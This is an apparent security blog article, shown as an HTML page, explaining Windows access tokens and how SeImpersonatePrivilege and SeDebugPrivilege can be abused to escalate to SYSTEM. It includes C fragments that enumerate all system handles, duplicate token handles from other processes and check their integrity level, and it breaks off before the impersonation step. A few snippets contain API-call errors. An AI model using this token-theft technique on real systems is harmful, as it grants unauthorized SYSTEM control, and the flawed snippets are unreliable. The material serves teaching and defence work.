@@ -1,0 +1,843 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Windows Access Tokens & Juicy Potatoes</title>
+    <meta name="description" content="Artículos técnicos sobre ciberseguridad, Active Directory, Binary Exploitation y más">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
+    <link href="/css/styles.css" rel="stylesheet">
+    <link href="/css/articles.css" rel="stylesheet">
+    <link href="/css/monokai.css" rel="stylesheet">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+</head>
+<body>
+    <button class="sidebar-toggle" id="sidebarToggle">☰</button>
+    <div class="container-fluid">
+        <div class="row">
+            <!-- Sidebar -->
+            <aside class="sidebar" id="sidebar">
+                <div class="sidebar-logo">
+                    <img src="/img/new-logo.png" alt="elswix Logo" onerror="this.src='https://via.placeholder.com/120/ff3b5c/ffffff?text=elswix'">
+                    <h3>elswix</h3>
+                </div>
+                <nav>
+                    <ul class="nav-menu">   
+                        <li class="nav-item">
+                            <a href="/" class="nav-link">
+                                <i>🏠</i>
+                                <span>Home</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/articles" class="nav-link active">
+                                <i>📝</i>
+                                <span>Articles</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/writeups" class="nav-link">
+                                <i>💻</i>
+                                <span>WriteUps</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/notes" class="nav-link">
+                                <i>📚</i>
+                                <span>Notes</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link">
+                                <i>⚡</i>
+                                <span>KL-Sunset</span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a href="/about" class="nav-link">
+                                <i>👤</i>
+                                <span>About me</span>
+                            </a>
+                        </li>
+                    </ul>
+                </nav>
+            </aside>
+
+            <!-- Main Content -->
+            <main>
+                <!-- Hero Section -->
+                <section class="hero mb-5">
+                    <img src="/img/articles/logo14.png" alt="Article logo" style="width: 120px; height: 120px; border-radius: 50%" onerror="this.src='https://via.placeholder.com/140/ff3b5c/ffffff?text=📝'">
+                    <h2>Windows Access Tokens & Impersonation</h2>
+                    <p>Understanding Windows Access Tokens</p>
+                </section>
+
+                <section class="article-content">
+<div class="article-container">
+<div class="article-content-main">
+<h3>Introduction</h3><br/>
+<p>A while ago I started learning about Windows Internals topics, such as Access Tokens. At that point, I wasn't inspired enough to write an article about it. However, the other day, after compromising an MSSQL Server instance, I came across a SeImpersonatePrivilege exploitation scenario in which I used PrintSpoofer to escalate privileges.</p><br/>
+<p>That experience made me realize that many people (my past self included) exploit SeImpersonatePrivilege without really understanding what it means. In this article, we will dive into how Windows access tokens work and how they relate to SeImpersonatePrivilege exploitation.</p><br/>
+<p>Also, playing with access tokens can be very useful in scenarios where an EDR is installed, because it allows us to avoid touching LSASS.</p><br/>
+<h3>Note</h3><br/>
+<p>This article is inspired by <a href="https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/">this post</a> written by <a href="https://twitter.com/Defte_">Aurélien Chalot</a>, which I read several months ago and which helped me better understand Windows access tokens. I also used some code from his <a href="https://github.com/sensepost/impersonate"><strong>impersonate</strong></a> project, specifically the <a href="https://github.com/sensepost/impersonate/blob/main/list_tokens.c"><code>list_tokens.cpp</code></a>, to demonstrate how to interact with tokens using the Windows API. </p><br/>
+<h3>Windows Access Tokens</h3><br/>
+<p>First, let’s talk about what access tokens are and why they play such a crucial role in processes and Windows security.</p><br/>
+<p>Broadly speaking, an access token is a data structure that describes the security context of a process (or a thread). In simple terms, it answers questions like: <em>Who am I?</em> and <em>What am I allowed to do?</em> Every time a process tries to access a resource, such as a file, a registry key, or another process, Windows checks its access token to decide whether that action is permitted or not.</p><br/>
+<p>Each process running on Windows has an associated access token. This token contains information such as the user account under which the process is running, the groups that user belongs to, and a list of privileges (like SeImpersonatePrivilege, SeDebugPrivilege, etc). You can think of it as an ID card that the process must show whenever it wants to do something sensitive.</p><br/>
+<p>Access tokens are usually created by the Windows kernel during the authentication process. When a user logs in, Windows validates their credentials and generates a <strong>primary access token</strong> representing that user. Any process started by that user will typically inherit a copy of this token. This is why, for example, a process running as a standard user cannot suddenly perform administrative actions without some form of privilege escalation.</p><br/>
+<p>It’s also important to note that access tokens are not limited to users. Services, scheduled tasks, and even system components run under their own tokens. Some of these tokens belong to highly privileged accounts like <strong>SYSTEM</strong>, which explains why compromising a process running under such a context can be extremely powerful.</p><br/>
+<h3>How they look</h3><br/>
+<p>Now, let's see a visual representation of an access token:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens1.png"/></p><br/>
+<p>This is a screenshot of Process Explorer showing the access token information of the <code>notepad.exe</code> process.</p><br/>
+<p>As we can see, it describes:</p><br/>
+<ul>
+<li>The user the token belongs to and its SID</li>
+<li>The session number (we won’t dive into this just yet)</li>
+<li>The user’s group memberships</li>
+<li>The logon session ID, which uniquely identifies the user within the system</li>
+<li>And the list of privileges associated with the user</li>
+</ul>
+<p>This access token of a low-privileged user, let's see how a local administrator token looks like:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens2.png"/></p><br/>
+<p>As expected, the local administrator token contains <strong>a large number of privileges</strong>. Each of these privileges allows the user who owns the token to perform specific actions within the system.</p><br/>
+<p>You might notice that most of the privileges are disabled. This is because, even if a specific privilege is present in your access token, it does not necessarily mean that you can use it. If a privilege is disabled, you won’t be able to take advantage of it.</p><br/>
+<p>However, if a privilege is shown as disabled, it can be enabled using the WinAPI function <code>AdjustTokenPrivileges</code>. Of course, this only works if your access token already includes the specified privilege, otherwise, there’s nothing to enable.</p><br/>
+<h3>Access Token Types</h3><br/>
+<p>Great! Now that we understand Access Tokens better, let's talk about the different types of Access Tokens that Windows provides. When we were talking about how access tokens are created, you might have noticed that I highlighted <strong>primary access tokens</strong>, and actually, that's one of the two types of access tokens that exist.</p><br/>
+<p>The nature of these tokens (i.e., the type) depends on the logon type: interactive and non-interactive.</p><br/>
+<h3>Interactive logon</h3><br/>
+<p>When talking about interactive logon, we refer to logging in through the Windows LogonUI. For example, when you turn on your computer and the OS loads, Windows prompts you to enter your credentials. This is what we refer to as an interactive logon. This applies when you connect locally to your computer or when connecting through RDP.</p><br/>
+<p>The authentication process works as follows:</p><br/>
+<ol>
+<li>You provide your credentials to the LogonUI.</li>
+<li>These credentials are forwarded to LSASS.</li>
+<li>LSASS verifies whether the credentials are correct.</li>
+<li>If they are valid, LSASS creates a <strong>primary access token</strong> that represents the logged-in user. This token is then inherited by every process launched by that user.</li>
+</ol>
+<p>This token allows Windows to determine whether the actions performed by processes launched by the user can be carried out with the user’s privileges. In other words, each time a process performs an important action, such as a file write, Windows checks the process’s access token to determine whether the user has sufficient privileges to perform that action.</p><br/>
+<p>One interesting aspect of an interactive logon is that when a user logs on interactively, Windows sends the provided credentials to the LSASS process and keeps them in memory to support the Single Sign-On (SSO) mechanism. Thanks to this, after authenticating once, the user can access other resources, such as remote shares or network services, without being asked for credentials again. This approach avoids constant re-authentication prompts and allows Windows to provide a smooth and seamless user experience while handling authentication transparently in the background.</p><br/>
+<p>For example, let’s look at what happens when you run a <code>dir</code> command against a remote share from PowerShell using a domain account:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens3.png"/></p><br/>
+<p>As shown above, I was able to list the C$ share on the ITDC01 machine from another system. In the background, Windows checks the primary token associated with the PowerShell process and verifies whether there are credentials linked to it in the LSASS process. Since the logon was interactive, those credentials were already stored in LSASS and were automatically used to authenticate against the remote service.</p><br/>
+<p>The key thing to remember is that <strong>Primary Tokens</strong> are associated with <strong>processes</strong>.</p><br/>
+<h3>Non-interactive logon</h3><br/>
+<p>On the other hand, we have the <strong>non-interactive logon</strong> type. This occurs when you connect remotely to a Windows machine, for example when accessing a remote SMB share.</p><br/>
+<p>The SMB service runs under the <strong>NT AUTHORITY\SYSTEM</strong> account because it requires high privileges to operate correctly. However, when a user connects to an SMB share, they do <strong>not</strong> inherit SYSTEM privileges. Instead, they only operate with the privileges of their own user account.</p><br/>
+<p>This behavior is the result of an internal Windows mechanism known as <strong>impersonation</strong>. When a connection to a remote service such as SMB is established, the service creates a new thread specifically for that user. The security context of this thread is then deliberately downgraded so that it runs with the user’s privileges rather than those of the NT AUTHORITY\SYSTEM account.</p><br/>
+<p>To achieve this, the Windows kernel creates an <strong>impersonation token</strong> (the second type of access token) and associates it with the newly created thread.</p><br/>
+<p>This is why the service accounts of services such as MSSQL have the <code>SeImpersonatePrivilege</code> in their access token, which we'll discuss in detail later. Otherwise, when connecting through Windows authentication, the MSSQL service would not be able to impersonate the user’s security context.</p><br/>
+<p>For non-interactive logon, credentials are not stored in the LSASS memory as mentioned earlier.</p><br/>
+<h3>Primary Tokens VS Impersonation Tokens</h3><br/>
+<p>As explained above, the key difference between Primary Tokens and Impersonation Tokens is that <strong>Primary Tokens are associated with processes</strong>, while <strong>Impersonation Tokens are associated with threads</strong>.</p><br/>
+<p>If you are not familiar with the difference between <strong>processes</strong> and <strong>threads</strong>, here is a simple explanation:</p><br/>
+<p>A <strong>process</strong> is an instance of a program running in the operating system. For example, when you open <em>notepad.exe</em>, the Windows kernel creates a new process with its own virtual memory space and loads the program’s code into it. This process inherits the <strong>primary token</strong> of your user, which defines its default security context.</p><br/>
+<p>A <strong>thread</strong> is a unit of execution that exists within a process. Threads share the same memory space and resources of the process they belong to, but each thread has its own execution context. Because threads can have their <strong>own impersonation token</strong>, a single service process (such as SMB running as SYSTEM) can handle multiple client connections simultaneously, each thread operating under the privileges of a different user when necessary.</p><br/>
+<h3>Practice Scenario</h3><br/>
+<p>Now that we understand what access tokens are and the different types that exist, let’s look at some examples of how we can interact with tokens, and even abuse them.</p><br/>
+<p>First, we’re going to practice in an example scenario to demonstrate how access tokens work and how we can interact with them. Then, using what we learn from this test, we’ll move to a more realistic scenario where things change a bit.</p><br/>
+<p>I set up a scenario where we have a user with <strong>SeImpersonatePrivilege</strong> and <strong>SeDebugPrivilege</strong> enabled. This could be, for example, a local administrator, but for demonstration purposes I just created a local account with these privileges. You might not know what these privileges are yet, but I’ll explain them along the way.</p><br/>
+<h3>Strategy</h3><br/>
+<p>This is our goal: escalate from <strong>Claire</strong> (the user with the privileges I mentioned earlier) to <strong>SYSTEM</strong> (<code>NT AUTHORITY\SYSTEM</code>, the highest privilege level on Windows).</p><br/>
+<p>Now, let’s walk through the attack at a high level.</p><br/>
+<p>First, we’ll abuse Claire’s privileges to enumerate all access tokens on the system across running processes. Then, we’ll inspect the privileges of those tokens, looking specifically for one that belongs to <strong>SYSTEM</strong>. Once we find it, we’ll duplicate that token and use <strong>SeImpersonatePrivilege</strong> to impersonate it.</p><br/>
+<p>At that point, our code will be running in a SYSTEM security context, allowing us to perform actions with maximum privileges.</p><br/>
+<p>It is okay if you don't understand it at all, we'll explain each step along the way.</p><br/>
+<h3>Exploitation 1 - Listing all access tokens</h3><br/>
+<p>First, let's check our current user privileges:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens4.png"/></p><br/>
+<p>As I mentioned earlier, this user has both <strong>SeImpersonatePrivilege</strong> and <strong>SeDebugPrivilege</strong>. They’re enabled, but sometimes they might show up as disabled. If that happens, it’s not over. You can still enable them using the <code>AdjustTokenPrivileges</code> function we talked about earlier.</p><br/>
+<p>Now, we have to list all tokens in the system. To retrieve every token, we can use the <code>NtQuerySystemInformation</code> WinAPI function. Essentially, this function can be used to return every handle available in the system, including process handles, file handles, and token handles, which are what we’re looking for.</p><br/>
+<p>The core of this step is the following call:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">NtQuerySystemInformation</span><span class="p">(</span><span class="n">SystemHandleInformation</span><span class="p">,</span><span class="w"> </span><span class="n">handleTableInformation</span><span class="p">,</span><span class="w"> </span><span class="n">SystemHandleInformationSize</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">returnLenght</span><span class="p">);</span>
+</pre></div>
+<p>While this function takes four parameters, the most important ones for our use case are the first two, since they define <em>what</em> we are querying and <em>where</em> the results will be stored.</p><br/>
+<p><code>SystemHandleInformation</code> (first parameter, the most important one)</p><br/>
+<p>This parameter tells <code>NtQuerySystemInformation</code> what kind of system data we want to retrieve.</p><br/>
+<p>By passing <code>SystemHandleInformation</code>, we’re asking Windows to give us a snapshot of all handles opened on the system, across all processes. This includes handles to files, processes, threads, and most importantly for us, access tokens as mentioned earlier.</p><br/>
+<p>This is the key piece that allows us to enumerate tokens belonging to other processes, including those running as SYSTEM.</p><br/>
+<p>At this point, <code>NtQuerySystemInformation</code> has given us a structure that contains <strong>every handle currently opened on the system</strong>. The <code>handleTableInformation</code> buffer works like a big table where each entry represents a handle owned by some process.</p><br/>
+<p>Because of that, enumerating them is straightforward: we can simply iterate over the table using a basic <code>for</code> loop and inspect each handle one by one.</p><br/>
+<div class="highlight"><pre><span></span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">DWORD</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">handleTableInformation</span><span class="o">-&gt;</span><span class="n">NumberOfHandles</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">SYSTEM_HANDLE_TABLE_ENTRY_INFO</span><span class="w"> </span><span class="n">handleInfo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">SYSTEM_HANDLE_TABLE_ENTRY_INFO</span><span class="p">)</span><span class="n">handleTableInformation</span><span class="o">-&gt;</span><span class="n">Handles</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+<span class="p">}</span>
+</pre></div>
+<p>Now that we can walk through all system handles, the next step is to check whether we can <strong>access the process that owns each handle</strong>. This is an important requirement: in order to manipulate a handle (for example, duplicate it), we must first have access to the process that created it.</p><br/>
+<p>To open processes that we don’t own, Windows requires a specific privilege: <strong>SeDebugPrivilege</strong>. Since our user already has this privilege (and we made sure it’s enabled earlier using <code>AdjustTokenPrivileges</code>), we’re allowed to open those processes.</p><br/>
+<p>Here’s the code used to open the target process and duplicate the handle:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">HANDLE</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OpenProcess</span><span class="p">(</span><span class="n">PROCESS_DUP_HANDLE</span><span class="p">,</span><span class="w"> </span><span class="n">FALSE</span><span class="p">,</span><span class="w"> </span><span class="n">handleInfo</span><span class="p">.</span><span class="n">ProcessId</span><span class="p">);</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">process</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">process</span><span class="p">);</span>
+<span class="w">    </span><span class="k">continue</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">DuplicateHandle</span><span class="p">(</span>
+<span class="w">    </span><span class="n">process</span><span class="p">,</span>
+<span class="w">    </span><span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="n">handleInfo</span><span class="p">.</span><span class="n">HandleValue</span><span class="p">,</span>
+<span class="w">    </span><span class="n">GetCurrentProcess</span><span class="p">(),</span>
+<span class="w">    </span><span class="o">&amp;</span><span class="n">dupHandle</span><span class="p">,</span>
+<span class="w">    </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">    </span><span class="n">FALSE</span><span class="p">,</span>
+<span class="w">    </span><span class="n">DUPLICATE_SAME_ACCESS</span>
+<span class="p">);</span>
+</pre></div>
+<p>At this point, <code>dupHandle</code> is a copy of the original handle, but now <strong>owned by our own process</strong>, which means we can safely work with it.</p><br/>
+<p>However, there’s still one missing piece: we don’t yet know <strong>what kind of Windows object this handle actually refers to</strong>. It could be a file, a process, a thread, or a token. To figure that out, we need to query the object type manually.</p><br/>
+<p>This is where <code>NtQueryObject</code> comes into play. This function allows us to retrieve information about a handle, including the <strong>type of object it represents</strong>, returned as a string.</p><br/>
+<div class="highlight"><pre><span></span><span class="n">LPWSTR</span><span class="w"> </span><span class="nf">GetObjectInfo</span><span class="p">(</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hObject</span><span class="p">,</span><span class="w"> </span><span class="n">OBJECT_INFORMATION_CLASS</span><span class="w"> </span><span class="n">objInfoClass</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">LPWSTR</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">dwSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">OBJECT_NAME_INFORMATION</span><span class="p">);</span>
+<span class="w">    </span><span class="n">POBJECT_NAME_INFORMATION</span><span class="w"> </span><span class="n">pObjectInfo</span><span class="w"> </span><span class="o">=</span>
+<span class="w">        </span><span class="p">(</span><span class="n">POBJECT_NAME_INFORMATION</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">dwSize</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">NTSTATUS</span><span class="w"> </span><span class="n">ntReturn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NtQueryObject</span><span class="p">(</span>
+<span class="w">        </span><span class="n">hObject</span><span class="p">,</span>
+<span class="w">        </span><span class="n">objInfoClass</span><span class="p">,</span>
+<span class="w">        </span><span class="n">pObjectInfo</span><span class="p">,</span>
+<span class="w">        </span><span class="n">dwSize</span><span class="p">,</span>
+<span class="w">        </span><span class="o">&amp;</span><span class="n">dwSize</span>
+<span class="w">    </span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">ntReturn</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">STATUS_BUFFER_OVERFLOW</span><span class="p">)</span><span class="w"> </span><span class="o">||</span>
+<span class="w">        </span><span class="p">(</span><span class="n">ntReturn</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">STATUS_INFO_LENGTH_MISMATCH</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">pObjectInfo</span><span class="w"> </span><span class="o">=</span>
+<span class="w">            </span><span class="p">(</span><span class="n">POBJECT_NAME_INFORMATION</span><span class="p">)</span><span class="n">realloc</span><span class="p">(</span><span class="n">pObjectInfo</span><span class="p">,</span><span class="w"> </span><span class="n">dwSize</span><span class="p">);</span>
+<span class="w">        </span><span class="n">ntReturn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NtQueryObject</span><span class="p">(</span>
+<span class="w">            </span><span class="n">hObject</span><span class="p">,</span>
+<span class="w">            </span><span class="n">objInfoClass</span><span class="p">,</span>
+<span class="w">            </span><span class="n">pObjectInfo</span><span class="p">,</span>
+<span class="w">            </span><span class="n">dwSize</span><span class="p">,</span>
+<span class="w">            </span><span class="o">&amp;</span><span class="n">dwSize</span>
+<span class="w">        </span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">ntReturn</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">STATUS_SUCCESS</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">pObjectInfo</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LPWSTR</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="n">pObjectInfo</span><span class="o">-&gt;</span><span class="n">Length</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">WCHAR</span><span class="p">));</span>
+<span class="w">        </span><span class="n">CopyMemory</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">pObjectInfo</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">,</span><span class="w"> </span><span class="n">pObjectInfo</span><span class="o">-&gt;</span><span class="n">Length</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">pObjectInfo</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">data</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>If you’re wondering why there are multiple comparisons on the return value of <code>NtQueryObject</code>, it’s because this function often returns errors like <code>STATUS_INFO_LENGTH_MISMATCH</code>. When that happens, it means the buffer we provided is too small, so we need to reallocate memory with the correct size and try again.</p><br/>
+<p>Anyway, using this function, <code>GetObjectInfo</code>, we can filter out everything that is <strong>not a token</strong>, and focus only on token handles. For example, we can use the following check to determine whether the dupHandle points to a Token or not:</p><br/>
+<div class="highlight"><pre><span></span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">wcscmp</span><span class="p">(</span><span class="n">GetObjectInfo</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">,</span><span class="w"> </span><span class="n">ObjectTypeInformation</span><span class="p">),</span><span class="w"> </span><span class="sa">L</span><span class="s">"Token"</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">process</span><span class="p">);</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">);</span>
+<span class="w">    </span><span class="k">continue</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>Basically, this is a comparison where <code>wcscmp</code> returns a value different from <code>0</code> if the strings are not equal. In that case, we just skip this handle and continue with the next one in <code>handleTableInformation</code>.</p><br/>
+<p>Once we’ve identified token handles, the final step is to inspect them more closely and check whether the token is a <strong>primary token or an impersonation token</strong>, who created it, and which user it belongs to. For this, we rely on <code>GetTokenInformation</code>.</p><br/>
+<div class="highlight"><pre><span></span><span class="n">BOOL</span><span class="w"> </span><span class="nf">GetTokenInformation</span><span class="p">(</span>
+<span class="w">    </span><span class="n">HANDLE</span><span class="w">                  </span><span class="n">TokenHandle</span><span class="p">,</span>
+<span class="w">    </span><span class="n">TOKEN_INFORMATION_CLASS</span><span class="w"> </span><span class="n">TokenInformationClass</span><span class="p">,</span>
+<span class="w">    </span><span class="n">LPVOID</span><span class="w">                  </span><span class="n">TokenInformation</span><span class="p">,</span>
+<span class="w">    </span><span class="n">DWORD</span><span class="w">                   </span><span class="n">TokenInformationLength</span><span class="p">,</span>
+<span class="w">    </span><span class="n">PDWORD</span><span class="w">                  </span><span class="n">ReturnLength</span>
+<span class="p">);</span>
+</pre></div>
+<p>For example, if we want to retrieve the owner of a token, we can query it like this:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">GetTokenInformation</span><span class="p">(</span>
+<span class="w">    </span><span class="n">dupHandle</span><span class="p">,</span>
+<span class="w">    </span><span class="n">TokenOwner</span><span class="p">,</span>
+<span class="w">    </span><span class="n">TokenStatisticsInformation</span><span class="p">,</span>
+<span class="w">    </span><span class="n">token_info</span><span class="p">,</span>
+<span class="w">    </span><span class="o">&amp;</span><span class="n">token_info</span>
+<span class="p">);</span>
+</pre></div>
+<p>By combining all these steps, enumerating handles, duplicating them, identifying token objects, and inspecting their properties, we can eventually locate a <strong>SYSTEM token</strong> that’s suitable for impersonation and move forward with the privilege escalation.</p><br/>
+<p>This tool is great because it retrieves all tokens in the system along with useful information. However, since our goal is simply to escalate to <strong>SYSTEM</strong>, I’ll tweak it to just spawn a <code>cmd</code> running as <code>SYSTEM</code>.</p><br/>
+<p>First, we must check the <strong>Token Integrity Level</strong>, since it helps us determine whether a token is likely to belong to SYSTEM or not.</p><br/>
+<p>But what exactly is an <strong>Integrity Level</strong>?</p><br/>
+<p>Integrity Levels are part of Windows Mandatory Integrity Control (MIC). They define <strong>how much trust Windows places in a process or token</strong>, and they’re used to restrict what actions that process is allowed to perform. In simple terms, the higher the integrity level, the more powerful the token is.</p><br/>
+<p>Windows mainly works with <strong>four integrity levels</strong>:</p><br/>
+<p><strong>Low Integrity</strong>: This is the most restricted level. Processes running with Low integrity have very limited access to system resources and can’t interact with higher-integrity processes.</p><br/>
+<p><strong>Medium Integrity</strong>: This is the default integrity level for standard user accounts. Most user applications run at this level.</p><br/>
+<p><strong>High Integrity</strong>: High integrity tokens are used by administrative processes. If you run a program “as administrator,” it will usually execute with a High integrity token. </p><br/>
+<p><strong>System Integrity</strong>: This is the highest integrity level. Tokens running at System integrity belong to <strong>NT AUTHORITY\SYSTEM</strong> and have full control over the operating system.</p><br/>
+<p>The last one is which we're looking for. To determine the integrity level of our Token, we can use <code>GetTokenInformation</code>, as said earlier, it allows to retrieve information about an specific token. To do so, I created the following function:</p><br/>
+<div class="highlight"><pre><span></span><span class="kt">bool</span><span class="w"> </span><span class="nf">is_system_integrity_level</span><span class="p">(</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">dupHandle</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">rtLength</span><span class="p">;</span>
+<span class="w">    </span><span class="n">GetTokenInformation</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">,</span><span class="w"> </span><span class="n">TokenIntegrityLevel</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">rtLength</span><span class="p">);</span>
+<span class="w">    </span><span class="n">PTOKEN_MANDATORY_LABEL</span><span class="w"> </span><span class="n">tInformation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">PTOKEN_MANDATORY_LABEL</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">rtLength</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">tInformation</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"Memory allocation error"</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">FALSE</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">GetTokenInformation</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">,</span><span class="w"> </span><span class="n">TokenIntegrityLevel</span><span class="p">,</span><span class="w"> </span><span class="n">tInformation</span><span class="p">,</span><span class="w"> </span><span class="n">rtLength</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">rtLength</span><span class="p">);</span>
+<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">SIL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="o">*</span><span class="n">GetSidSubAuthority</span><span class="p">(</span><span class="n">tInformation</span><span class="o">-&gt;</span><span class="n">Label</span><span class="p">.</span><span class="n">Sid</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">DWORD</span><span class="p">)(</span><span class="n">UCHAR</span><span class="p">)(</span><span class="o">*</span><span class="n">GetSidSubAuthorityCount</span><span class="p">(</span><span class="n">tInformation</span><span class="o">-&gt;</span><span class="n">Label</span><span class="p">.</span><span class="n">Sid</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">));</span>
+<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">tInformation</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">SIL</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">SECURITY_MANDATORY_SYSTEM_RID</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>This function simply checks whether a given token is running at <strong>System integrity level</strong>.</p><br/>
+<p>First, it uses <code>GetTokenInformation</code> with the <code>TokenIntegrityLevel</code> flag to retrieve the integrity information associated with the token. Since we don’t know the required buffer size beforehand, the function is called once to get the correct size, memory is allocated, and then it’s called again to actually retrieve the data.</p><br/>
+<p>The key part happens when we extract the <strong>RID (Relative Identifier)</strong> from the token’s SID. This value represents the token’s integrity level. If the RID is greater than or equal to <code>SECURITY_MANDATORY_SYSTEM_RID</code>, we know the token belongs to SYSTEM (or higher), which is exactly what we’re looking for.</p><br/>
+<p>If that condition is met, the function returns <code>true</code>, otherwise, it returns <code>false</code>.</p><br/>
+<p>Alright, what’s next? Now we need to determine whether the token is a <strong>Primary token</strong> or an <strong>Impersonation token</strong>.</p><br/>
